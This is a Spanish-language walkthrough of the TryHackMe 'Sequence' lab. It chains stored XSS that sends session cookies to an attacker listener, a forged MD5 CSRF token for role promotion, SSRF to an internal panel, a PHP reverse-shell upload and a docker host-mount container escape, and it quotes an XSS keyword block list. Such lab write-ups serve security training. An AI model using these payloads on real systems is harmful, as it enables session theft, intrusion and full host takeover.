---
title: "Sequence"
platform: "TryHackMe"
os: "Linux"
difficulty: "Hard"
ip: "10.82.181.48"
slug: "sequence"
author: "Z4k7"
date: "2026-03-10"
year: "2026"
status: "pwned"
tags:
  - "XSS"
  - "SSRF"
  - "Cookie"
  - "HttpOnly"
  - "CSRF"
techniques:
  - "XSS"
  - "SSRF"
  - "Cookie"
  - "HttpOnly"
  - "CSRF"
tools:
  - "Nmap"
  - "Fuff"
flags_list:
  - label: "Email"
    value: "software@review.thm"
  - label: "Email"
    value: "product@review.thm"
  - label: "Usuario"
    value: "null"
  - label: "Password"
    value: "S60u}f5j"
  - label: "Flag"
    value: "THM{M0dH@ck3dPawned007}"
  - label: "Flag2"
    value: "THM{Adm1NPawned007}"
  - label: "Flag3"
    value: "THM{rootAccessD0n3}"
summary: "Descripción del vector de ataque."
steps:

  - id: "exploit_1"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Robert hizo algunas actualizaciones de último momento a la `review.thm`sitio web antes de irse de vacaciones. Afirma que la información secreta de los financieros está completamente protegida. Pero ¿son sus defensas realmente infalibles? Su reto es explotar las vulnerabilidades y obtener el control total del sistema.

  - id: "recon"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Validamos si contamos con conexión a la ip por medio de un `ping`
      - kind: "code"
        lang: "BASH"
        code: |
          ping -c 6 10.82.181.48
          PING 10.82.181.48 (10.82.181.48) 56(84) bytes of data.
          64 bytes from 10.82.181.48: icmp_seq=1 ttl=64 time=0.918 ms
          64 bytes from 10.82.181.48: icmp_seq=2 ttl=64 time=0.910 ms
          64 bytes from 10.82.181.48: icmp_seq=3 ttl=64 time=0.352 ms
          64 bytes from 10.82.181.48: icmp_seq=4 ttl=64 time=0.819 ms
          64 bytes from 10.82.181.48: icmp_seq=5 ttl=64 time=0.549 ms
          64 bytes from 10.82.181.48: icmp_seq=6 ttl=64 time=0.666 ms
          
          --- 10.82.181.48 ping statistics ---
          6 packets transmitted, 6 received, 0% packet loss, time 5073ms
          rtt min/avg/max/mdev = 0.352/0.702/0.918/0.204 ms
      - kind: "note"
        text: |
          Contamos  con la conexión  al servidor victima validamos si la ip  cuenta  con su nombre de `hosts`
      - kind: "code"
        lang: "BASH"
        code: |
          root@ip-10-82-68-250:~# cat /etc/hosts
          127.0.0.1	localhost
          127.0.0.1       vnc.tryhackme.tech
          127.0.1.1	tryhackme.lan	tryhackme
          
          The following lines are desirable for IPv6 capable hosts
          
          ::1     localhost ip6-localhost ip6-loopback
          ff02::1 ip6-allnodes
          ff02::2 ip6-allrouters
      - kind: "note"
        text: |
          Se recomienda aplicar el name para la ip asignada el name del dominio de la ip se encuentra en el objetivo del laboratorio
      - kind: "code"
        lang: "BASH"
        code: |
          root@ip-10-82-68-250:~# echo "10.82.181.48 revew.thm" | tee -a /etc/hosts
          10.82.181.48 revew.thm
      - kind: "note"
        text: |
          Se valida ya contamos con el hosts de la ip a si podemos interactuar mejor con el entorno , consultamos si contamos con el acceso desde el navegador  con el  nombre del dominio creado
      - kind: "image"
        src: "assets/images/Sequence/file-20260310111115724.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Iniciamos con un escaneo completo de puertos para identificar servicios expuestos en la máquina objetivo.
      - kind: "code"
        lang: "BASH"
        code: |
          root@ip-10-82-68-250:~# nmap -sVC -O -T4 10.82.181.48
      - kind: "bullet"
        text: "Puerto 80 Apache httpd 2.4.41 ((Ubuntu))"

  - id: "enum"
    num: "03"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Entramos a validar si el dominio puede contar con directorios o subdominios que nos validar alguna información adicional de lo encontrado.
      - kind: "code"
        lang: "BASH"
        code: |
          ffuf -u http://revew.thm/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -ic 
          
                  /'___\  /'___\           /'___\       
                 /\ \__/ /\ \__/  __  __  /\ \__/       
                 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
                  \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
                   \ \_\   \ \_\  \ \____/  \ \_\       
                    \/_/    \/_/   \/___/    \/_/       
          
                 v1.3.1
          ________________________________________________
          
           :: Method           : GET
           :: URL              : http://revew.thm/FUZZ
           :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
           :: Follow redirects : false
           :: Calibration      : false
           :: Timeout          : 10
           :: Threads          : 40
           :: Matcher          : Response status: 200,204,301,302,307,401,403,405
          ________________________________________________
          
          uploads                 [Status: 301, Size: 308, Words: 20, Lines: 10]
          mail                    [Status: 301, Size: 305, Words: 20, Lines: 10]
                                  [Status: 200, Size: 1694, Words: 234, Lines: 69]
          phpmyadmin              [Status: 301, Size: 311, Words: 20, Lines: 10]
          server-status           [Status: 403, Size: 274, Words: 20, Lines: 10]
          :: Progress: [218265/218265] :: Job [1/1] :: 3139 req/sec :: Duration: [0:00:22] :: Errors: 0 ::
      - kind: "note"
        text: |
          Validamos con directorio que podríamos interactuar para tratar de extraer información, validando en los directorios en la parte de   `mail` se puede  validar un documento  dump.txt de un correo
      - kind: "code"
        lang: "PYTHON"
        code: |
          From: software@review.thm
          To: product@review.thm
          Subject: Update on Code and Feature Deployment
          
          Hi Team,
          
          I have successfully updated the code. The Lottery and Finance panels have also been created.
          
          Both features have been placed in a controlled environment to prevent unauthorized access. The Finance panel (`/finance.php`) is hosted on the internal 192.x network, and the Lottery panel (`/lottery.php`) resides on the same segment.
          
          For now, access is protected with a completed 8-character alphanumeric password (S60u}f5j), in order to restrict exposure and safeguard details regarding our potential investors.
          
          I will be away on holiday but will be back soon.
          
          Regards,  
          Robert
      - kind: "note"
        text: |
          contamos con dos correos que pueden ser utilizado como usuario  para algún login o acceso

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "Email"
        value: "software@review.thm"
      - label: "Email"
        value: "product@review.thm"
      - label: "Usuario"
        value: "null"
      - label: "Password"
        value: "S60u}f5j"

  - id: "step4"
    num: "04"
    title: "Consulta"
    content:
      - kind: "note"
        text: |
          Validamos que centramos con unos directorios que nos brinda información
          `/finance.php`
          `/lottery.php`
          Validando el correo menciona que para poder acceder al los dóminos anteriores en la misma debe ser desde la misma red podría ser un posible   #SSRF

  - id: "exploit"
    num: "05"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Validamos en la interfaz  de usuario contamos con acceso  en un apartado de  `contact`  en la parte de usuario no evidenciamos alguna url que podamos suplantar para poder acceder por medio de SSRF podríamos tratar de validar si atacamos por medio de XSS  para tratar de obtener la cookie del usuario
          Validamos el envió de alguna información por medio del formulario obtendremos
      - kind: "image"
        src: "assets/images/Sequence/file-20260310120139383.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Consultamos por medio de la consola del navegador el estado del `HttpOnly` para validar si se puede obtener la cookie por medio de la url.
          se realiza por medio de un sever si el usuario esta activo cuando realiza cualquier consulta  sobre los mensajes que se envían por medio de contact , No ponemos en escucha por medio del puerto 8989
      - kind: "code"
        lang: "PYTHON"
        code: |
          root@ip-10-82-68-250:~# python3 -m http.server 8989
      - kind: "note"
        text: |
          Script enviamos por medio del formulario para consultar si contamos con escucha por parte de la victima.
      - kind: "code"
        lang: "JS"
        code: |
          <script>
          	fetch("http://10.82.68.250:8989/")
          </script>
      - kind: "note"
        text: |
          se envía el formulario  de la siguiente manera para confirmar que contamos con interacción por parte del usuario
      - kind: "code"
        lang: "JS"
        code: |
          POST /contact.php HTTP/1.1
          Host: revew.thm
          User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
          Accept-Language: en-GB,en;q=0.9
          Accept-Encoding: gzip, deflate, br
          Content-Type: application/x-www-form-urlencoded
          Content-Length: 107
          Origin: http://revew.thm
          Connection: keep-alive
          Referer: http://revew.thm/contact.php
          Cookie: PHPSESSID=5pmombn8n2284i9dpeeallf78a
          Upgrade-Insecure-Requests: 1
          Priority: u=0, i
          
          name=%3Cscript%3E+%09fetch%28%22http%3A%2F%2F10.82.68.250%3A8989%2F%22%29+%3C%2Fscript%3E&phone=a&message=a
      - kind: "note"
        text: |
          En el contenido el formulario envió el payload por medio del input name validando en el dominio se evidencia interacción por parte de la victima
      - kind: "image"
        src: "assets/images/Sequence/file-20260310122205316.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Se aplica el siguiente script para obtener la cookie session.
      - kind: "code"
        lang: "JS"
        code: |
          <script>
          	fetch("http://10.82.68.250:8989/?"+document.cookie)
          </script>
      - kind: "note"
        text: |
          Se opine la cookie del usuario
      - kind: "code"
        lang: "JS"
        code: |
          python3 -m http.server 8980 
          Serving HTTP on 0.0.0.0 port 8980 (http://0.0.0.0:8980/) ...
          10.82.181.48 - - [10/Mar/2026 17:35:14] "GET /?PHPSESSID=9dgovqc45ek179i1kjimkqhn1o HTTP/1.1" 200 -
      - kind: "note"
        text: |
          Se modifica la cookie del navegacion y podemos validar que contamos con el acceso a la web de un usuario en este caso el usuario que estaba a la escucha como agente de contact
      - kind: "image"
        src: "assets/images/Sequence/file-20260310123918793.jpg"
        caption: "Evidencia técnica"

  - id: "flag_02"
    type: "flag"
    flag_items:
      - label: "Flag"
        value: "THM{M0dH@ck3dPawned007}"

  - id: "flag_02_post"
    num: ""
    title: "Post Flag"
    content:
      - kind: "note"
        text: |
          En el apartado de Settings  podemos validar que se puede realizar modificaciones pero en este caso  el usuario actual no cuenta con permisos para dicho cambio
      - kind: "image"
        src: "assets/images/Sequence/file-20260310124256225.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          La unica opción que se puede validar donde se tiene contacto con el usuario administrador es por medio del chat ,Tarto de enviar un simple xss para validar si es posible capturar el codigo de session como se realiza anterior mente y no se permite
      - kind: "image"
        src: "assets/images/Sequence/file-20260310124440583.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Consultando el código fuente se evidencia un script que evita la inyección de código arbitrario en el chat de usuario.
      - kind: "code"
        lang: "JS"
        code: |
          <script>
          document.getElementById("chatForm").addEventListener("submit", function(e) {
              const msg = document.querySelector('input[name="message"]').value.toLowerCase();
              const dangerous = ["<script>", "</script>", "onerror", "onload", "fetch", "ajax", "xmlhttprequest", "eval", "document.cookie", "window.location"];
              for (let keyword of dangerous) {
                  if (msg.includes(keyword)) {
                      e.preventDefault();
                      const modal = new bootstrap.Modal(document.getElementById("warningModal"));
                      modal.show();
                      break;
                  }
              }
          });
          </script>
      - kind: "note"
        text: |
          Validamos el codigo de la solicitud para cambio de rol de usuario y podemos validar que contamos con un  token #CSRF
      - kind: "code"
        lang: "JS"
        code: |
          CSRF:ad148a3ca8bd0ef3b48c52454c493ec5
      - kind: "note"
        text: |
          Si validamos este token  es posible que sea un MD5 podríamos tratar de validar que es dicho token y efectivamente es  cómo resultado  `mon` solo pasamos el  usuario de admin a MD5
      - kind: "image"
        src: "assets/images/Sequence/file-20260310143217543.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          se realiza el el hash en MD5
      - kind: "image"
        src: "assets/images/Sequence/file-20260310143240838.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Tendremos como resultado el siguiente token
      - kind: "code"
        lang: "JS"
        code: |
          CSRF:21232f297a57a5a743894a0e4a801fc3
      - kind: "note"
        text: |
          Ya solo queda enviar el link para cambio de rol
      - kind: "code"
        lang: "JS"
        code: |
          GET /promote_coadmin.php?username=mon&csrf_token_promote=ad148a3ca8bd0ef3b48c52454c493ec5 HTTP/1.1
          Host: revew.thm
          User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
          Accept: */*
          Accept-Language: en-GB,en;q=0.9
          Accept-Encoding: gzip, deflate, br
          Referer: http://revew.thm/settings.php
          Connection: keep-alive
          Cookie: PHPSESSID=9dgovqc45ek179i1kjimkqhn1o
          Priority: u=0
      - kind: "code"
        lang: "HTML"
        code: |
          http://review.thm/promote_coadmin.php?username=mod&csrf_token_promote=21232f297a57a5a743894a0e4a801fc3
      - kind: "image"
        src: "assets/images/Sequence/file-20260310143546648.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Se puede validar que ya contamos con cambio de rol de usuario
      - kind: "image"
        src: "assets/images/Sequence/file-20260310144707543.jpg"
        caption: "Evidencia técnica"

  - id: "flag_03"
    type: "flag"
    flag_items:
      - label: "Flag2"
        value: "THM{Adm1NPawned007}"

  - id: "flag_03_post"
    num: ""
    title: "Post Flag"
    content:
      - kind: "note"
        text: |
          Se validaron unos dominios con anterioridad se validaron unos dominios por medio del correo podemos aplicar intercept para tratar de validar si es posible acceder a dicho apartado
      - kind: "code"
        lang: "JS"
        code: |
          POST /dashboard.php HTTP/1.1
          Host: 10.82.152.168
          User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
          Accept-Language: en-GB,en;q=0.9
          Accept-Encoding: gzip, deflate, br
          Referer: http://10.82.152.168/dashboard.php
          Content-Type: multipart/form-data; boundary=----geckoformboundaryeeb345f2fa15c592babd29dc8e233d38
          Content-Length: 179
          Origin: http://10.82.152.168
          Connection: keep-alive
          Cookie: PHPSESSID=a1fma5967drksefo25lo5egggr
          Upgrade-Insecure-Requests: 1
          Priority: u=0, i
          
          ------geckoformboundaryeeb345f2fa15c592babd29dc8e233d38
          Content-Disposition: form-data; name="feature"
          
          lottery.php
          ------geckoformboundaryeeb345f2fa15c592babd29dc8e233d38--
      - kind: "note"
        text: |
          cambiamos esta parte  `lottery.php` por el apartado de  `/finance.php`  validamos y tenemos acceso a un formulario para ingresar  el password  en el correo ya nos brindaron  el password
      - kind: "image"
        src: "assets/images/Sequence/file-20260310150006438.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Nos permite acceder a un apartado para cargar un archivo creería que puede ser el apartado de upload ya lo teníamos mapeado  en la parte del `fuff`
      - kind: "image"
        src: "assets/images/Sequence/file-20260310150132216.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Utilizamos una delas cargas disponibles en la MV  una de las revershell.php realizamos la modificación cargamos el archivo y nos ponemos en escucha en el puerto 1234
      - kind: "code"
        lang: "BASH"
        code: |
          nc -lvnp 1234
          Listening on 0.0.0.0 1234
      - kind: "code"
        lang: "HTML"
        code: |
          \u2705 File uploaded successfully in uploads folder!
          File Name: cri.php
          Path: uploads/cri.php
          Size: 5.37 KB
          Type: application/x-php
      - kind: "note"
        text: |
          se envía la solicitud
      - kind: "code"
        lang: "JS"
        code: |
          POST /dashboard.php HTTP/1.1
          Host: 10.82.152.168
          User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
          Accept-Language: en-GB,en;q=0.9
          Accept-Encoding: gzip, deflate, br
          Content-Type: multipart/form-data; boundary=----geckoformboundary1deaff03dc08719ceb2d532dc68816e1
          Content-Length: 179
          Origin: http://10.82.152.168
          Connection: keep-alive
          Referer: http://10.82.152.168/dashboard.php
          Cookie: PHPSESSID=a1fma5967drksefo25lo5egggr
          Upgrade-Insecure-Requests: 1
          Priority: u=0, i
          
          ------geckoformboundary1deaff03dc08719ceb2d532dc68816e1
          Content-Disposition: form-data; name="feature"
          
          uploads/cri.php
          ------geckoformboundary1deaff03dc08719ceb2d532dc68816e1--
      - kind: "note"
        text: |
          se valida y contamos con la revershell
      - kind: "code"
        lang: "BASH"
        code: |
          nc -lvnp 1234
          Listening on 0.0.0.0 1234
          Connection received on 10.82.152.168 43296
          Linux 4f18a45cca05 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 GNU/Linux
          sh: 1: w: not found
          uid=0(root) gid=0(root) groups=0(root)
          /bin/sh: 0: can't access tty; job control turned off
      - kind: "note"
        text: |
          No pasamos a una interfaz mas dinámica para validar los directorios  `/bin/bash -i`
          validamos los permisos del usuario actual contamos con root
      - kind: "code"
        lang: "PYTHON"
        code: |
          root@4f18a45cca05:/# id
          id
          uid=0(root) gid=0(root) groups=0(root)
      - kind: "note"
        text: |
          validamos que estamos en un docker aplicamos el siguiente codigo
      - kind: "code"
        lang: "BASH"
        code: |
          docker run -v /:/host --name FINAL phpvulnerable &

  - id: "step6"
    num: "06"
    title: "Desglose del comando"
    content:
      - kind: "note"
        text: |
          `docker run` — Crea y ejecuta un nuevo contenedor.
          `-v /:/host` — ⚠️ MUY PELIGROSO: Monta todo el sistema de archivos raíz del host (`/`) dentro del contenedor en la ruta `/host`. Esto significa que el contenedor tiene acceso completo a todos los archivos del sistema anfitrión.
          `--name FINAL` — Le asigna el nombre "FINAL" al contenedor.
          `phpvulnerable` — Usa una imagen llamada `phpvulnerable`, que por su nombre sugiere ser una aplicación PHP intencionalmente vulnerable (probablemente para prácticas de seguridad/CTF).
          `&` — Ejecuta el proceso en segundo plano (background) en la shell actual.
          pasamos comandos
      - kind: "code"
        lang: "BASH"
        code: |
          docker exec FINAL (command)
      - kind: "code"
        lang: "BASH"
        code: |
          root@4f18a45cca05:/# docker exec FINAL ls /host/root
          docker exec FINAL ls /host/root
          bin
          flag.txt
          lib
          root
          share
          snap
          ~
          root@4f18a45cca05:/# docker exec FINAL cat /host/root/flag.txt 
          docker exec FINAL cat /host/root/flag.txt
          THM{rootAccessD0n3}
          root@4f18a45cca05:/#

  - id: "flag_04"
    type: "flag"
    flag_items:
      - label: "Flag3"
        value: "THM{rootAccessD0n3}"

lessons:
  - "Completar lecciones aprendidas"
mitigation: 'Completar mitigaciones recomendadas.'
---
